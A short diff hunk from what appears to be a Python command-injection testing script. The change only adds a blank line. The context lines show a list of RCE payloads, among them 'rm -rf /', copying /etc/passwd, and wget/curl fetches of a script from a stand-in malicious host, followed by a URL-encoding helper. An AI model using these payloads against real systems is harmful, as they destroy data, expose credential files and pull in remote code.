@@ -82,6 +82,7 @@ rce_payloads = [
     "`rm -rf /`", "`touch /tmp/vuln`", "`echo Hello`", "$(echo Exploit)", "$(rm /tmp/file)", "`cp /etc/passwd /tmp/`", "`ping -c 1 8.8.8.8`",
     "`wget http://malicious.com/script.sh`", "`curl http://malicious.com/script.sh`"
 ]
+
 # Encoding Function
 def encode_payload(payload):
     """Encode the payload using URL encoding."""
